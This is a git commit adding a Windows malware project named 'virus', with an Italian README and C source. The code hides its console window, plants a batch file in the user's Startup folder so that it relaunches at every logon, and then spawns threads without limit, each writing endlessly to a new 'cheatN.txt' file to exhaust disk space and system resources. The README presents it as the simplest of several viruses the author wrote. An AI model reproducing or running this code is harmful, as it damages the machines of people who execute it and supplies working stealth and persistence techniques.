1c89d5b095d47fcace6ab7969770ac7146cab906
naga272 <114398392+naga272@users.noreply.github.com>
2023-07-21 13:56:59 +0200

    virus

---
+++ virus/README.md
@@ -0,0 +1,20 @@
+# Virus
+
+![Language](https://img.shields.io/badge/Spellcheck-Pass-green?style=flat)
+![Platform](https://img.shields.io/badge/OS%20platform%20supported-Windows-blue?style=flat)
+
+## Descrizione
+
+Programma creato col linguaggio C che genera all'infinito dei thread, per ogni thread creato crea un file con un nome diverso. Per ogni file creato viene scritto al suo interno all'infinito. La shell viene nascosta in automatico all'avvio del programma. Per interrompere l'esecuzione del programma bisogna andare sul gestione attività e tra i processi in background terminare l'eseguibile. Questa è la versione più facile del virus che ho creato 
+
+## Requisiti
+
+- s.o. : eseguibile per Windows 10 
+
+## Tags
+
+pthread.h stdio.h stdlib.h while windows.h for shell HWND int 
+
+## Author
+
+Bastianello Federico
---
+++ virus/package/virus.c
@@ -0,0 +1,57 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <windows.h> // libreria che uso per nascondere la console
+#include <pthread.h>
+
+#ifndef MAX
+	#define MAX 100
+	void *infinity(void *param);
+	void bat();
+#else
+	#error
+#endif
+
+int main(int argc, char *argv[]){
+	int n_file;
+	srand(time(0));
+	pthread_t multi_thread;			// multi thread
+	HWND myWindow = GetConsoleWindow();
+	ShowWindow(myWindow, SW_HIDE); 	//nascondo la console
+
+	bat();
+	for(n_file = 0;;n_file++)
+		pthread_create(&multi_thread, NULL, infinity, (void*)n_file);
+	pthread_join(multi_thread, NULL);
+	return 0;
+}
+
+
+void *infinity(void *param){
+	int n_file = (int)param;
+	FILE *handle;
+	char filename[MAX];
+	sprintf(filename, "cheat%d.txt", n_file);
+	handle = fopen(filename, "w");
+	
+	while(1){
+		fprintf(handle, "c");
+	}
+}
+
+
+void bat(){
+	char 
+		enviroment[MAX] = "",
+		percorso_corrente[MAX] = "";
+
+	strcat(percorso_corrente, "cd ");
+	strcat(enviroment, getenv("APPDATA"));
+	strcat(enviroment, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_0xa4a.bat");
+	FILE *batch = fopen(enviroment, "w");
+	strcat(percorso_corrente, "/");	
+	fprintf(batch, "%s", "@echo off\n");
+	fprintf(batch, "%s", percorso_corrente);
+	fprintf(batch, "%s", "\nvirus.exe");
+	fclose(batch);
+}
